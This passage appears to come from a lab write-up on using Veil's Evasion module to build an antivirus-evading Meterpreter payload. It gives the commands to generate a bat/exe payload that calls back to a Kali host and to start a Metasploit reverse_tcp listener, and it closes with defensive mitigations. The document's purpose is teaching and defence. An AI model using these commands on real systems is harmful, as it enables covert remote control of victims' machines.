## 4. 📋 Steps to Generate a Payload Using Veil
A stealth payload was generated by following these steps:

1. Launch the Veil tool and go to the Evasion module:
```bash
veil use 1 # Select Evasion
```

2. Display the list of available payloads and look for a Meterpreter payload:
```bash
list
```

3. Choose the appropriate payload (number `22` was selected, which generates a `bat`/`exe` file that connects to Meterpreter):
```bash
use 22
```

4. Set the attacker's IP (Kali) and the listening port:
```bash
set LHOST 192.168.3.8
set LPORT 1234
```

## 5. 📡 Running the Listener in Metasploit
After generating the payload, the listener was started on the Kali machine to receive the reverse connection from the target machine:
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.3.8
set LPORT 1234
run
```

## 10. 🛡️ How to Protect Against This Attack (Mitigation)
Based on this experiment, the following actions are necessary to protect against encrypted payload attacks:
- 🔒 **Updating Security Software**: Make sure Windows Defender and other security programs are continually updated to recognize new payload signatures.
- 🧠 **Enable Behavioral Protection**: Some modern security systems detect suspicious behavior (like reverse connection attempts) not just signatures.
- 🚫 **Restrict File Execution**: Prevent running `.bat` or `.exe` files from untrusted folders via group policies (AppLocker).
- 🔥 **Enable Firewall**: Block outbound connections on unknown ports from users' devices.
- 👨‍🏫 **Awareness**: Train users not to open suspicious files even if they look trustworthy.
